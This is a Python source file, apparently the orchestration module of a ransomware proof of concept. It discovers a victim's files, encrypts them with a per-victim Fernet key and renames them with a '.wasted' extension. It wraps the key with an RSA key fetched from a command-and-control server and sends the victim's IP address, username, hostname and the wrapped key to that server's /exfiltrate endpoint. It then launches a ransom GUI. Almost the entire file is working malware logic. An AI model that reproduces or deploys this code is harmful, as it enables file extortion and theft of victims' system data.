from ransomware.config import AppConfig
from ransomware.logging import logger
from ransomware.discovery.discoverer import FileDiscoverer
from ransomware.crypto.encryptor import Encryptor
from ransomware.crypto.keys import Keys
from ransomware.network.client import NetworkClient
from ransomware.exceptions import RansomwareError
from ransomware.gui.main import RansomwareGUI
import os
from typing import Optional
import sys
import platform
import getpass
import requests

class RansomwareApp:
    """
    Main application class for orchestrating ransomware operations:
    - Key management
    - File discovery
    - Encryption/Decryption
    - Network communication
    - GUI launch
    """
    def __init__(self, config: AppConfig):
        """
        Initialize the RansomwareApp with configuration and dependencies.
        """
        self.config = config
        self.logger = logger
        self.network_client = NetworkClient(config)
        self.key = None
        self.encryptor: Optional[Encryptor] = None
        self.machine_id: Optional[str] = None

    def get_machine_id(self) -> str:
        """Build a unique machine identifier."""
        return f"{self.get_local_ip()}_{platform.node()}_{getpass.getuser()}"

    def exfiltrate_to_c2(self, root_dir: str):
        """
        Send exfiltration data to the C2 server using HTTP POST.
        Includes the RSA-encrypted Fernet key so the attacker can decrypt it
        with their private key after payment.
        """
        self.machine_id = self.get_machine_id()
        # Fix: decode bytes to string for JSON serialization
        encrypted_key_str = self._encrypted_fkey.decode() if isinstance(self._encrypted_fkey, bytes) else self._encrypted_fkey
        data = {
            "ip_address": self.get_local_ip(),
            "operating_system": platform.system(),
            "username": getpass.getuser(),
            "hostname": platform.node(),
            "target_directory": root_dir,
            "victim_fernet_key": encrypted_key_str,
        }
        url = f"{self.config.c2_server_url.rstrip('/')}/exfiltrate"
        try:
            response = requests.post(url, json=data, timeout=self.config.timeout)
            response.raise_for_status()
            logger.info(f"Exfiltration data sent to C2 server at {url}")
        except Exception as e:
            logger.error(f"Failed to exfiltrate data to C2 server: {e}")

    @staticmethod
    def get_local_ip():
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return 'Unknown'

    def run_process(self, root_dir: str, encrypt: bool = True, extension: str = ".wasted", machine_id: Optional[str] = None):
        """
        Discover files and perform encryption or decryption, then launch the GUI if encrypting.

        Hybrid encryption flow (encrypt=True):
          1. Fetch RSA public key from C2 via /public_key
          2. Generate a unique per-victim Fernet key
          3. Encrypt files with Fernet key
          4. Encrypt the Fernet key with the RSA public key
          5. Exfiltrate machine data + RSA-encrypted Fernet key to C2
          6. Launch GUI

        Hybrid decryption flow (encrypt=False):
          1. Fetch the plaintext Fernet key from C2 via /fetch_key
          2. Decrypt files with the Fernet key
          3. No GUI is launched in decrypt mode
        """
        if encrypt:
            # 1. Fetch RSA public key from C2
            rsa_public_key_pem = self.network_client.fetch_public_key()
            logger.info("Fetched RSA public key from C2")

            # 2. Generate unique Fernet key per victim
            self.key = Encryptor.generate_key()
            logger.info("Generated unique Fernet key for this victim")

            # Save Fernet key locally for PoC recovery (in real ransomware, this wouldn't happen)
            key_save_path = os.path.join(root_dir, ".fernet_key")
            with open(key_save_path, 'wb') as f:
                f.write(self.key)
            logger.info(f"Fernet key saved locally to {key_save_path}")

            # 3. Encrypt files with Fernet key (in memory, not yet saved to disk)
            discoverer = FileDiscoverer(root_dir)
            files = discoverer.discover_files()
            logger.info(f"Processing {len(files)} files in {root_dir}")
            processed = 0
            self._encrypted_fkey = Keys.encrypt_with_rsa(self.key, rsa_public_key_pem.encode())
            logger.info("Fernet key encrypted with RSA public key")

            for file in files:
                try:
                    if not file.endswith(extension):
                        Encryptor(self.key).encrypt_file(file)
                        os.rename(file, file + extension)
                        processed += 1
                except Exception as e:
                    logger.error(f"Failed to process {file}: {e}")

            # 4. Exfiltrate: machine data + RSA-encrypted Fernet key
            self.exfiltrate_to_c2(root_dir)

            logger.info(f"Encryption complete. Total files encrypted: {processed}")

            # 5. Launch GUI with decrypt command
            decrypt_cmd = [sys.executable, sys.argv[0], "-p", root_dir, "-d", "--mid", self.machine_id]
            gui = RansomwareGUI(target_dir=root_dir, decrypt_cmd=decrypt_cmd)
            gui.mainloop()
        else:
            # Decryption: fetch plaintext Fernet key from C2, or fall back to local key file
            mid = machine_id or self.get_machine_id()
            logger.info(f"Fetching decryption key for machine: {mid}")
            fernet_key = None

            # Try to fetch from C2 first
            try:
                fernet_key = self.network_client.fetch_decrypted_key(mid)
                logger.info("Fernet key received from C2")
                # Ensure bytes for Fernet (network returns base64 string)
                if isinstance(fernet_key, str):
                    fernet_key = fernet_key.encode()
            except Exception as e:
                logger.warning(f"Failed to fetch key from C2: {e}")
                # Fall back to local key file for PoC
                local_key_path = os.path.join(root_dir, ".fernet_key")
                if os.path.exists(local_key_path):
                    with open(local_key_path, 'rb') as f:
                        fernet_key = f.read()
                    logger.info(f"Fernet key loaded from local file: {local_key_path}")
                else:
                    raise RansomwareError(f"Cannot decrypt: C2 unreachable and no local key found at {local_key_path}")

            self.key = fernet_key if isinstance(fernet_key, bytes) else fernet_key.encode()
            self.encryptor = Encryptor(self.key)

            discoverer = FileDiscoverer(root_dir)
            files = discoverer.discover_files()
            logger.info(f"Processing {len(files)} files in {root_dir}")
            processed = 0
            for file in files:
                try:
                    if file.endswith(extension):
                        self.encryptor.decrypt_file(file)
                        os.rename(file, file[:-len(extension)])
                        processed += 1
                except Exception as e:
                    logger.error(f"Failed to process {file}: {e}")
            logger.info(f"Decryption complete. Total files decrypted: {processed}")

    def _get_machine_id_from_args(self) -> str:
        """Extract machine_id from --mid argument passed to decrypt command."""
        try:
            idx = sys.argv.index("--mid")
            return sys.argv[idx + 1]
        except (ValueError, IndexError):
            return self.get_machine_id()

    def run(self):
        """
        Placeholder for future orchestration logic.
        """
        logger.info("Starting Ransomware PoC...")
        # Orchestrate discovery, encryption, networking, etc.
        pass 